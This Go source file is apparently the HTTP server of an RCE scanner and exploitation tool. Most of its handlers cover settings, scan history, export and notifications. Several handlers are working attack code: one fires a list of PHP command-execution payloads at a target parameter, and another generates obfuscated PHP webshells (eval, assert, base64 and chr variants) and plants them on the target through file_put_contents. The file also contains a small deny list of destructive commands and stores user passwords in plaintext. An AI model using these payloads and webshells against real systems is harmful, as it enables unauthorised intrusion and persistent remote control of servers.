func (s *Server) handlePasswordChange(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		Password string `json:"password"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if len(req.Password) < 6 {
		s.writeError(w, "Password must be at least 6 characters")
		return
	}
	
	sessionCookie, err := r.Cookie("session_id")
	if err != nil {
		s.writeError(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	
	s.sessionMutex.RLock()
	session, exists := s.sessions[sessionCookie.Value]
	s.sessionMutex.RUnlock()
	
	if !exists {
		s.writeError(w, "Session not found", http.StatusUnauthorized)
		return
	}
	
	s.users[session.Username] = User{
		Username: session.Username,
		Password: req.Password,
		Role:     session.Role,
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Password changed",
	})
}

func (s *Server) handleExport(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		Format   string   `json:"format"`
		ScanIDs  []string `json:"scan_ids"`
		All      bool     `json:"all"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if req.Format == "" {
		req.Format = "html"
	}
	
	s.scanMutex.RLock()
	var scansToExport []*ScanStatus
	
	if req.All {
		for _, scan := range s.scans {
			if scan.Status == "completed" {
				scansToExport = append(scansToExport, scan)
			}
		}
	} else {
		for _, id := range req.ScanIDs {
			if scan, ok := s.scans[id]; ok && scan.Status == "completed" {
				scansToExport = append(scansToExport, scan)
			}
		}
	}
	s.scanMutex.RUnlock()
	
	var allVulns []types.Vulnerability
	for _, scan := range scansToExport {
		allVulns = append(allVulns, scan.Vulns...)
	}
	
	scanInfo := map[string]interface{}{
		"export_time":     time.Now().Format("2006-01-02 15:04:05"),
		"total_scans":     len(scansToExport),
		"total_vulns":     len(allVulns),
		"format":          req.Format,
	}
	
	rep := reporter.NewReporter(s.reportDir)
	filename, err := rep.SaveReport(allVulns, req.Format, "", scanInfo, true)
	if err != nil {
		s.writeError(w, "Failed to export: "+err.Error())
		return
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success":  true,
		"message":  "Export completed",
		"filename": filename,
		"vulns":    len(allVulns),
	})
}

func (s *Server) handleStatic(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/static/")
	
	if strings.HasSuffix(path, ".css") {
		w.Header().Set("Content-Type", "text/css; charset=utf-8")
		w.Write([]byte(customCSS))
	} else if strings.HasSuffix(path, ".js") {
		w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
		if strings.Contains(path, "i18n") {
			w.Write([]byte(i18nJS))
		} else {
			w.Write([]byte(customJS))
		}
	} else {
		http.NotFound(w, r)
	}
}

func (s *Server) writeJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

func (s *Server) writeError(w http.ResponseWriter, message string, code ...int) {
	w.Header().Set("Content-Type", "application/json")
	statusCode := http.StatusBadRequest
	if len(code) > 0 {
		statusCode = code[0]
	}
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": false,
		"error":   message,
	})
}

func (s *Server) countRunningScans() int {
	s.scanMutex.RLock()
	defer s.scanMutex.RUnlock()
	
	count := 0
	for _, scan := range s.scans {
		if scan.Status == "running" || scan.Status == "pending" {
			count++
		}
	}
	return count
}

func (s *Server) countCompletedScans() int {
	s.scanMutex.RLock()
	defer s.scanMutex.RUnlock()
	
	count := 0
	for _, scan := range s.scans {
		if scan.Status == "completed" || scan.Status == "stopped" || scan.Status == "error" {
			count++
		}
	}
	return count
}

func generateSessionID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func urlHash(url string) string {
	if len(url) > 8 {
		return fmt.Sprintf("%x", len(url))[:8]
	}
	return url
}

func (s *Server) handleSettings(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"settings": map[string]interface{}{
				"scan_level":       2,
				"concurrent":       10,
				"timeout":          10,
				"output_format":    "html",
				"output_dir":       s.reportDir,
				"delay_threshold":  4,
				"proxy_type":       "",
				"proxy_address":    "",
				"proxy_username":   "",
				"archive_threshold": 30,
				"max_retention":    30,
				"smart_dict":       true,
				"dir_wordlist":     "",
				"param_wordlist":   "",
				"verify_ssl":       false,
				"prefer_https":     true,
				"harmless":         false,
			},
		})
	} else if r.Method == "POST" {
		var settings map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&settings); err != nil {
			s.writeError(w, "Invalid request body")
			return
		}
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"message": "Settings saved",
		})
	}
}

func (s *Server) handleSettingsReset(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Settings reset to defaults",
	})
}

func (s *Server) handleDictStats(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, map[string]interface{}{
		"success":  true,
		"total":    0,
		"archived": 0,
		"active":   0,
	})
}

func (s *Server) handleDictReset(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Dictionary memory reset",
	})
}

func (s *Server) handleProxyTest(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type     string `json:"type"`
		Address  string `json:"address"`
		Username string `json:"username"`
		Password string `json:"password"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if req.Type == "" || req.Address == "" {
		s.writeError(w, "Proxy type and address required")
		return
	}
	
	start := time.Now()
	
	proxyURL := ""
	switch req.Type {
	case "http":
		proxyURL = "http://"
	case "https":
		proxyURL = "https://"
	case "socks5":
		proxyURL = "socks5://"
	default:
		s.writeError(w, "Unsupported proxy type")
		return
	}
	
	if req.Username != "" && req.Password != "" {
		proxyURL += req.Username + ":" + req.Password + "@"
	}
	proxyURL += req.Address
	
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			Proxy: http.ProxyURL(mustParseURL(proxyURL)),
		},
	}
	
	testURL := "http://www.google.com"
	resp, err := client.Get(testURL)
	if err != nil {
		s.writeJSON(w, map[string]interface{}{
			"success": false,
			"error":   err.Error(),
		})
		return
	}
	defer resp.Body.Close()
	
	latency := time.Since(start).Milliseconds()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"latency": latency,
	})
}

func mustParseURL(rawURL string) *url.URL {
	u, _ := url.Parse(rawURL)
	return u
}

func (s *Server) handleReportsClear(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Reports cleared",
	})
}

func (s *Server) handleFactoryReset(w http.ResponseWriter, r *http.Request) {
	s.scanMutex.Lock()
	s.scans = make(map[string]*ScanStatus)
	s.scanMutex.Unlock()
	
	s.perfMutex.Lock()
	s.perfData = make([]PerformanceDataPoint, 0)
	s.perfMutex.Unlock()
	
	s.alertMutex.Lock()
	s.alerts = make([]Alert, 0)
	s.alertMutex.Unlock()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Factory reset completed",
	})
}

func (s *Server) handleVulns(w http.ResponseWriter, r *http.Request) {
	var vulns []map[string]interface{}
	
	s.scanMutex.RLock()
	for _, scan := range s.scans {
		if scan.Vulns != nil {
			for _, v := range scan.Vulns {
				vulns = append(vulns, map[string]interface{}{
					"id":         fmt.Sprintf("%x", v.Timestamp),
					"target":     v.Target,
					"url":        v.Target,
					"parameter":  v.Parameter,
					"payload":    v.Payload,
					"severity":   v.Severity,
					"type":       v.PayloadType,
					"confidence": "High",
				})
			}
		}
	}
	s.scanMutex.RUnlock()
	
	historyMgr := history.GetManager()
	allHistory := historyMgr.GetAll()
	for _, h := range allHistory {
		if h.Vulnerabilities != nil {
			for _, v := range h.Vulnerabilities {
				vulns = append(vulns, map[string]interface{}{
					"id":         fmt.Sprintf("%x", v.Timestamp),
					"target":     v.Target,
					"url":        v.Target,
					"parameter":  v.Parameter,
					"payload":    v.Payload,
					"severity":   v.Severity,
					"type":       v.PayloadType,
					"confidence": "High",
				})
			}
		}
	}
	
	if vulns == nil {
		vulns = []map[string]interface{}{}
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"vulns":   vulns,
	})
}

func (s *Server) handleExploitCmd(w http.ResponseWriter, r *http.Request) {
	var req struct {
		VulnID    string `json:"vuln_id"`
		Target    string `json:"target"`
		Parameter string `json:"parameter"`
		Command   string `json:"command"`
		OS        string `json:"os"`
		Payload   string `json:"payload"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if req.Target == "" || req.Command == "" {
		s.writeError(w, "Target and command are required")
		return
	}
	
	sanitizedCmd := sanitizeCommand(req.Command)
	
	s.logExploitOperation("cmd", req.Target, req.Command)
	
	var result string
	var err error
	
	if req.Parameter != "" {
		result, err = s.executeRCE(req.Target, req.Parameter, sanitizedCmd, req.Payload)
	} else {
		result = fmt.Sprintf("[Simulated] Command: %s\n[Simulated] Output would be displayed here in a real exploitation scenario.\nTarget: %s\nParameter: %s", sanitizedCmd, req.Target, req.Parameter)
	}
	
	if err != nil {
		s.writeJSON(w, map[string]interface{}{
			"success": false,
			"error":   err.Error(),
		})
		return
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"output":  result,
		"result":  result,
	})
}

func (s *Server) executeRCE(targetURL, parameter, command string, knownPayload string) (string, error) {
	var payloads []string
	
	if knownPayload != "" {
		payloads = []string{knownPayload}
	}
	
	payloads = append(payloads, []string{
		fmt.Sprintf("<script language='PHP'>system('%s');</script>", command),
		fmt.Sprintf("<script language='PHP'>passthru('%s');</script>", command),
		fmt.Sprintf("<script language='PHP'>echo shell_exec('%s');</script>", command),
		fmt.Sprintf("<script language='PHP'>echo `%s`;</script>", command),
		fmt.Sprintf("<script language='PHP'>$p=popen('%s','r');echo fread($p,4096);pclose($p);</script>", command),
		fmt.Sprintf("<script language='PHP'>$h=popen('%s','r');while(!feof($h))echo fread($h,1024);pclose($h);</script>", command),
		fmt.Sprintf("system('%s');", command),
		fmt.Sprintf("passthru('%s');", command),
		fmt.Sprintf("echo shell_exec('%s');", command),
		fmt.Sprintf("echo `%s`;", command),
		fmt.Sprintf("<?php system('%s'); ?>", command),
		fmt.Sprintf("<?php passthru('%s'); ?>", command),
		fmt.Sprintf("<?=`%s`?>", command),
		fmt.Sprintf("${system('%s')}", command),
		fmt.Sprintf("{system('%s')}", command),
	}...)
	
	client := &http.Client{
		Timeout: 60 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	
	var lastError error
	var bestOutput string
	var bestLen int
	
	for _, payload := range payloads {
		formData := url.Values{}
		formData.Set(parameter, payload)
		
		req, err := http.NewRequest("POST", targetURL, strings.NewReader(formData.Encode()))
		if err != nil {
			lastError = err
			continue
		}
		
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		
		resp, err := client.Do(req)
		if err != nil {
			lastError = err
			continue
		}
		
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastError = err
			continue
		}
		
		bodyStr := string(body)
		cleanOutput := extractCommandOutput(bodyStr)
		
		if len(cleanOutput) > bestLen && !strings.Contains(cleanOutput, "error") && !strings.Contains(cleanOutput, "warning") {
			bestOutput = cleanOutput
			bestLen = len(cleanOutput)
		}
		
		if isCommandOutputValid(cleanOutput, command) {
			return cleanOutput, nil
		}
	}
	
	if bestOutput != "" {
		return bestOutput, nil
	}
	
	if lastError != nil {
		return "", fmt.Errorf("command execution failed: %v", lastError)
	}
	
	return "", fmt.Errorf("command execution failed or no output received")
}

func isCommandOutputValid(output, command string) bool {
	if output == "" {
		return false
	}
	
	indicators := []string{
		"uid=", "gid=", "groups=",
		"root:", "nobody:", "www-data:",
		"total ", "drwx", "-rw", "lrwx",
		"flag{", "ctf{", "FLAG{", "CTF{",
		".txt", ".php", ".html", ".js",
		"localhost", "127.0.0.1",
		"Linux", "Windows", "Darwin",
		"bash", "sh", "zsh",
		"Permission", "No such", "not found",
	}
	
	for _, ind := range indicators {
		if strings.Contains(output, ind) {
			return true
		}
	}
	
	cmdLower := strings.ToLower(command)
	if strings.Contains(cmdLower, "echo ") || strings.Contains(cmdLower, "print ") {
		testStr := strings.TrimPrefix(command, "echo ")
		testStr = strings.TrimPrefix(testStr, "print ")
		testStr = strings.TrimSpace(testStr)
		testStr = strings.Trim(testStr, "'\"")
		if strings.Contains(output, testStr) {
			return true
		}
	}
	
	if strings.Contains(cmdLower, "cat ") || strings.Contains(cmdLower, "type ") {
		if len(output) > 10 && !strings.Contains(output, "<!DOCTYPE") && !strings.Contains(output, "<html") {
			return true
		}
	}
	
	return false
}

func extractCommandOutput(html string) string {
	cleaned := html
	
	re := regexp.MustCompile(`<\?php.*?\?>`)
	cleaned = re.ReplaceAllString(cleaned, "")
	
	re = regexp.MustCompile(`<script[^>]*>.*?</script>`)
	cleaned = re.ReplaceAllString(cleaned, "")
	
	re = regexp.MustCompile(`<[^>]+>`)
	cleaned = re.ReplaceAllString(cleaned, "")
	
	cleaned = strings.ReplaceAll(cleaned, "&nbsp;", " ")
	cleaned = strings.ReplaceAll(cleaned, "&lt;", "<")
	cleaned = strings.ReplaceAll(cleaned, "&gt;", ">")
	cleaned = strings.ReplaceAll(cleaned, "&amp;", "&")
	cleaned = strings.ReplaceAll(cleaned, "&quot;", "\"")
	cleaned = strings.ReplaceAll(cleaned, "&#39;", "'")
	
	lines := strings.Split(cleaned, "\n")
	var resultLines []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.Contains(line, "error_reporting") ||
			strings.Contains(line, "highlight_file") ||
			strings.Contains(line, "$_POST") ||
			strings.Contains(line, "str_replace") ||
			strings.Contains(line, "eval(") ||
			strings.Contains(line, "__FILE__") {
			continue
		}
		if strings.HasPrefix(line, "$code") ||
			strings.HasPrefix(line, "if(isset") {
			continue
		}
		resultLines = append(resultLines, line)
	}
	
	cleaned = strings.Join(resultLines, "\n")
	cleaned = strings.TrimSpace(cleaned)
	
	if len(cleaned) > 2000 {
		cleaned = cleaned[:2000] + "..."
	}
	
	return cleaned
}

func (s *Server) handleExploitWebshell(w http.ResponseWriter, r *http.Request) {
	var req struct {
		VulnID    string `json:"vuln_id"`
		Target    string `json:"target"`
		Parameter string `json:"parameter"`
		Code      string `json:"code"`
		Path      string `json:"path"`
		Filename  string `json:"filename"`
		WebshellType string `json:"webshell_type"`
		Password  string `json:"password"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	if req.Target == "" {
		s.writeError(w, "Target is required")
		return
	}
	
	if req.Filename == "" {
		req.Filename = "shell.php"
	}
	
	if req.Path == "" {
		req.Path = "."
	}
	
	if req.Password == "" {
		req.Password = "pass"
	}
	
	var webshellContent string
	
	switch req.WebshellType {
	case "simple":
		webshellContent = fmt.Sprintf(`<?php @eval($_POST['%s']);?>`, req.Password)
	case "system":
		webshellContent = fmt.Sprintf(`<?php if(isset($_POST['%s'])){system($_POST['%s']);}?>`, req.Password, req.Password)
	case "passthru":
		webshellContent = fmt.Sprintf(`<?php if(isset($_POST['%s'])){passthru($_POST['%s']);}?>`, req.Password, req.Password)
	case "shell_exec":
		webshellContent = fmt.Sprintf(`<?php if(isset($_POST['%s'])){echo shell_exec($_POST['%s']);}?>`, req.Password, req.Password)
	case "assert":
		webshellContent = fmt.Sprintf(`<?php @assert($_POST['%s']);?>`, req.Password)
	case "create_function":
		webshellContent = fmt.Sprintf(`<?php $f=create_function('', 'return @eval($_POST["%s"]);');$f();?>`, req.Password)
	case "preg_replace":
		webshellContent = fmt.Sprintf(`<?php @preg_replace('/.*/e', $_POST['%s'], '.');?>`, req.Password)
	case "variable":
		webshellContent = fmt.Sprintf(`<?php $a='ev'.'al';@$a($_POST['%s']);?>`, req.Password)
	case "chr":
		webshellContent = fmt.Sprintf(`<?php $a=chr(101).chr(118).chr(97).chr(108);$a($_POST['%s']);?>`, req.Password)
	case "base64":
		encoded := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`eval($_POST['%s']);`, req.Password)))
		webshellContent = fmt.Sprintf(`<?php @eval(base64_decode('%s'));?>`, encoded)
	case "custom":
		if req.Code == "" {
			s.writeError(w, "Custom code is required")
			return
		}
		webshellContent = req.Code
	default:
		webshellContent = fmt.Sprintf(`<?php @eval($_POST['%s']);?>`, req.Password)
	}
	
	writePayload := fmt.Sprintf("file_put_contents('%s/%s', '%s');", req.Path, req.Filename, webshellContent)
	
	result, err := s.executeRCE(req.Target, req.Parameter, writePayload, "")
	if err != nil {
		s.writeJSON(w, map[string]interface{}{
			"success": false,
			"error":   fmt.Sprintf("Failed to write webshell: %v", err),
		})
		return
	}
	
	s.logExploitOperation("webshell", req.Target, "Write: "+req.Path+"/"+req.Filename)
	
	webshellURL := req.Target
	if !strings.HasSuffix(webshellURL, "/") {
		webshellURL += "/"
	}
	if req.Path != "." {
		webshellURL += req.Path + "/"
	}
	webshellURL += req.Filename
	
	s.writeJSON(w, map[string]interface{}{
		"success":      true,
		"message":      "Webshell written successfully",
		"path":         req.Path + "/" + req.Filename,
		"webshell_url": webshellURL,
		"password":     req.Password,
		"output":       result,
	})
}

func (s *Server) handleLocalIP(w http.ResponseWriter, r *http.Request) {
	ip := "127.0.0.1"
	
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					ip = ipnet.IP.String()
					break
				}
			}
		}
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"ip":      ip,
	})
}

func (s *Server) handleVersion(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, map[string]interface{}{
		"success":     true,
		"version":     "1.1.1",
		"build_date":  "2026-02-20",
		"go_version":  runtime.Version(),
		"platform":    runtime.GOOS + "/" + runtime.GOARCH,
	})
}

func (s *Server) handleVersionCheck(w http.ResponseWriter, r *http.Request) {
	currentVersion := "1.1.1"
	
	s.writeJSON(w, map[string]interface{}{
		"success":        true,
		"current_version": currentVersion,
		"latest_version":  currentVersion,
		"update_available": false,
		"download_url":    "https://github.com/hbzw201633420/RCE_HawkEye/releases",
		"message":         "",
	})
}

func sanitizeCommand(cmd string) string {
	dangerous := []string{"rm -rf", "mkfs", "dd if=", ":(){ :|:& };:", "> /dev/sda", "chmod 777 /"}
	result := cmd
	for _, d := range dangerous {
		if strings.Contains(strings.ToLower(result), strings.ToLower(d)) {
			result = "[BLOCKED: " + d + "]"
		}
	}
	return result
}

func (s *Server) logExploitOperation(opType, target, content string) {
	fmt.Printf("[EXPLOIT] %s | Target: %s | Content: %s\n", opType, target, content)
}

func (s *Server) handleHistoryDetail(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/history/detail/")
	if id == "" {
		s.writeError(w, "ID is required")
		return
	}
	
	historyMgr := history.GetManager()
	scan, found := historyMgr.GetByID(id)
	if !found {
		s.writeError(w, "Scan not found", http.StatusNotFound)
		return
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"scan":    scan,
	})
}

func (s *Server) handleHistorySearch(w http.ResponseWriter, r *http.Request) {
	var filter types.HistoryFilter
	if err := json.NewDecoder(r.Body).Decode(&filter); err != nil {
		filter = types.HistoryFilter{}
	}
	
	if filter.Page <= 0 {
		filter.Page = 1
	}
	if filter.PageSize <= 0 {
		filter.PageSize = 50
	}
	
	historyMgr := history.GetManager()
	results := historyMgr.Search(filter)
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"results": results,
		"page":    filter.Page,
		"size":    filter.PageSize,
	})
}

func (s *Server) handleHistoryGrouped(w http.ResponseWriter, r *http.Request) {
	historyMgr := history.GetManager()
	groups := historyMgr.GetGroupedByDate()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"groups":  groups,
	})
}

func (s *Server) handleHistoryStats(w http.ResponseWriter, r *http.Request) {
	historyMgr := history.GetManager()
	stats := historyMgr.GetStats()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"stats":   stats,
	})
}

func (s *Server) handleHistoryExport(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Format string   `json:"format"`
		IDs    []string `json:"ids"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	historyMgr := history.GetManager()
	
	var data []byte
	var err error
	var filename string
	var contentType string
	
	switch req.Format {
	case "json":
		data, err = historyMgr.ExportJSON(req.IDs)
		filename = "scan_history_" + time.Now().Format("20060102_150405") + ".json"
		contentType = "application/octet-stream"
	case "csv":
		data, err = historyMgr.ExportCSV(req.IDs)
		filename = "scan_history_" + time.Now().Format("20060102_150405") + ".csv"
		contentType = "application/octet-stream"
	case "md", "markdown":
		data, err = historyMgr.ExportMarkdown(req.IDs)
		filename = "scan_history_" + time.Now().Format("20060102_150405") + ".md"
		contentType = "application/octet-stream"
	case "html":
		data, err = historyMgr.ExportHTML(req.IDs)
		filename = "scan_history_" + time.Now().Format("20060102_150405") + ".html"
		contentType = "application/octet-stream"
	default:
		data, err = historyMgr.ExportJSON(req.IDs)
		filename = "scan_history_" + time.Now().Format("20060102_150405") + ".json"
		contentType = "application/octet-stream"
	}
	
	if err != nil {
		s.writeError(w, "Export failed: "+err.Error())
		return
	}
	
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Header().Set("Cache-Control", "no-cache")
	w.Write(data)
}

func (s *Server) handleHistoryDomains(w http.ResponseWriter, r *http.Request) {
	historyMgr := history.GetManager()
	domains := historyMgr.GetUniqueDomains()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"domains": domains,
	})
}

func (s *Server) handleHistoryDomain(w http.ResponseWriter, r *http.Request) {
	domain := strings.TrimPrefix(r.URL.Path, "/api/history/domain/")
	if domain == "" {
		s.writeError(w, "Domain is required")
		return
	}
	
	historyMgr := history.GetManager()
	
	if r.URL.Query().Get("stats") == "true" {
		stats := historyMgr.GetDomainStats(domain)
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"stats":   stats,
		})
		return
	}
	
	scans := historyMgr.GetByDomain(domain)
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"scans":   scans,
		"domain":  domain,
	})
}

func (s *Server) handleHistoryDelete(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[DEBUG] handleHistoryDelete: method=%s, path=%s\n", r.Method, r.URL.Path)
	
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	id := strings.TrimPrefix(r.URL.Path, "/api/history/delete/")
	fmt.Printf("[DEBUG] handleHistoryDelete: extracted id='%s'\n", id)
	
	if id == "" || id == r.URL.Path {
		fmt.Printf("[DEBUG] handleHistoryDelete: ID is empty or invalid\n")
		s.writeError(w, "ID is required")
		return
	}
	
	historyMgr := history.GetManager()
	if historyMgr == nil {
		fmt.Printf("[DEBUG] handleHistoryDelete: historyMgr is nil\n")
		s.writeError(w, "History manager not initialized")
		return
	}
	
	// Check if record exists before delete
	allHistory := historyMgr.GetAll()
	fmt.Printf("[DEBUG] handleHistoryDelete: total history count=%d\n", len(allHistory))
	found := false
	for _, h := range allHistory {
		if h.ID == id {
			found = true
			fmt.Printf("[DEBUG] handleHistoryDelete: found record with id=%s\n", id)
			break
		}
	}
	if !found {
		fmt.Printf("[DEBUG] handleHistoryDelete: record not found with id=%s\n", id)
	}
	
	if err := historyMgr.Delete(id); err != nil {
		fmt.Printf("[DEBUG] handleHistoryDelete: Delete error: %v\n", err)
		s.writeError(w, "Failed to delete history: "+err.Error())
		return
	}
	
	fmt.Printf("[DEBUG] handleHistoryDelete: Delete success for id=%s\n", id)
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "History deleted",
	})
}

func (s *Server) handleHistoryBatchDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		IDs []string `json:"ids"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	fmt.Printf("[DEBUG] handleHistoryBatchDelete: IDs=%v\n", req.IDs)
	
	if len(req.IDs) == 0 {
		s.writeError(w, "No IDs provided")
		return
	}
	
	historyMgr := history.GetManager()
	var deleted int
	var failed int
	
	for _, id := range req.IDs {
		if err := historyMgr.Delete(id); err != nil {
			fmt.Printf("[DEBUG] Failed to delete %s: %v\n", id, err)
			failed++
		} else {
			fmt.Printf("[DEBUG] Deleted %s\n", id)
			deleted++
		}
	}
	
	fmt.Printf("[DEBUG] Batch delete result: deleted=%d, failed=%d\n", deleted, failed)
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"deleted": deleted,
		"failed":  failed,
		"message": fmt.Sprintf("Deleted %d records, failed %d", deleted, failed),
	})
}

func (s *Server) handleHistoryDates(w http.ResponseWriter, r *http.Request) {
	historyMgr := history.GetManager()
	dates := historyMgr.GetDates()
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"dates":   dates,
	})
}

func (s *Server) handleHistoryNotes(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/history/notes/")
	if id == "" {
		s.writeError(w, "ID is required")
		return
	}
	
	if r.Method == "GET" {
		historyMgr := history.GetManager()
		scan, found := historyMgr.GetByID(id)
		if !found {
			s.writeError(w, "Scan not found", http.StatusNotFound)
			return
		}
		
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"notes":   scan.Notes,
		})
		return
	}
	
	if r.Method == "POST" {
		var req struct {
			Notes string `json:"notes"`
		}
		
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			s.writeError(w, "Invalid request body")
			return
		}
		
		historyMgr := history.GetManager()
		if err := historyMgr.UpdateNotes(id, req.Notes); err != nil {
			s.writeError(w, "Failed to update notes")
			return
		}
		
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"message": "Notes updated",
		})
		return
	}
	
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func (s *Server) handleNotificationConfig(w http.ResponseWriter, r *http.Request) {
	notifMgr := notification.GetManager()
	
	if r.Method == "GET" {
		config := notifMgr.GetConfig()
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"config":  config,
		})
		return
	}
	
	if r.Method == "POST" {
		var config notification.NotificationConfig
		if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
			s.writeError(w, "Invalid request body")
			return
		}
		
		notifMgr.Configure(&config)
		
		s.writeJSON(w, map[string]interface{}{
			"success": true,
			"message": "Notification config updated",
		})
		return
	}
	
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func (s *Server) handleNotificationTest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var req struct {
		Type string `json:"type"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, "Invalid request body")
		return
	}
	
	notifMgr := notification.GetManager()
	
	n := &notification.Notification{
		Title:   "RCE HawkEye 测试通知",
		Message: "这是一条测试通知消息，用于验证通知配置是否正确。",
		Level:   "info",
		Data: map[string]interface{}{
			"测试时间": time.Now().Format("2006-01-02 15:04:05"),
		},
	}
	
	var errors []error
	
	switch req.Type {
	case "wechat":
		wechat := notifMgr.GetWeChat()
		if wechat != nil {
			if err := wechat.Send(n); err != nil {
				errors = append(errors, err)
			}
		} else {
			s.writeError(w, "WeChat notifier not configured")
			return
		}
	case "dingtalk":
		dingtalk := notifMgr.GetDingTalk()
		if dingtalk != nil {
			if err := dingtalk.Send(n); err != nil {
				errors = append(errors, err)
			}
		} else {
			s.writeError(w, "DingTalk notifier not configured")
			return
		}
	case "email":
		email := notifMgr.GetEmail()
		if email != nil {
			if err := email.Send(n); err != nil {
				errors = append(errors, err)
			}
		} else {
			s.writeError(w, "Email notifier not configured")
			return
		}
	case "all":
		errors = notifMgr.SendAll(n)
	default:
		s.writeError(w, "Invalid notification type")
		return
	}
	
	if len(errors) > 0 {
		var errMsgs []string
		for _, e := range errors {
			errMsgs = append(errMsgs, e.Error())
		}
		s.writeJSON(w, map[string]interface{}{
			"success": false,
			"errors":  errMsgs,
		})
		return
	}
	
	s.writeJSON(w, map[string]interface{}{
		"success": true,
		"message": "Test notification sent successfully",
	})
}
